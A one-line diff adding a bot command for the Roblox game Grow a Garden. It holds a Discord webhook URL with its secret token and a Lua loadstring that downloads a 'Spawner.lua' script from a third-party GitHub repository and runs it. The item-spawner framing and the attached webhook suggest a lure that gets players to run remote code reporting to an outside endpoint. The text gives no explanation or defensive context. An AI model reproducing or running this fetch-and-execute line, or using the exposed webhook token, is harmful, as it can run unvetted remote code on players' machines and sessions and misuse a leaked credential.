@@ -1,0 +1,1 @@
+/generate-growagarden username: pilopangat webhook: https://ptb.discord.com/api/webhooks/1230111999183290368/DUjJC3679rKLQxcTMymoDkRgld9urkmhBmsDUQeqX7Y-Pq5O8AnUH3eBvEKRkoF849eK github: Pilopangat loadstring: local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))() Spawner.Load()
